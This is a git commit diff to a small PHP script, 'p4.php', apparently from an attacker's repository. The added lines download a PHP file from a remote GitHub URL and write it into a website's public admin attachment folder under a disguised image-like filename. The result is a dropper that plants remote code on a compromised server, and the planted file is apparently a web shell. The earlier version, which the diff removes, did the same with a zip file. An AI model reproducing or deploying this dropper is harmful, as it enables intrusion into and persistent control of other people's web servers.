5ab045aebf4aa22d80c7ef4bc18a0d3d873653c4
zzqwq555 <45870079+zzqwq555@users.noreply.github.com>
2018-12-17 14:45:39 +0800

    Update p4.php

--- p4.php
+++ p4.php
@@ -1,4 +1,5 @@
 <?php
 //https://github.com/zzqwq555/t1/raw/master/help.zip
-$code=file_get_contents('https://github.com/zzqwq555/t1/raw/master/help.zip');
-file_put_contents('/home/home/mco/basiclaw/public_html/admin/attachment/tbn_l201802141020140.zip',$code);
+//https://raw.githubusercontent.com/zzqwq555/t1/master/p2.php
+$code=file_get_contents('https://raw.githubusercontent.com/zzqwq555/t1/master/p2.php');
+file_put_contents('/home/home/mco/basiclaw/public_html/admin/attachment/tbn_l201802141020140.php',$code);
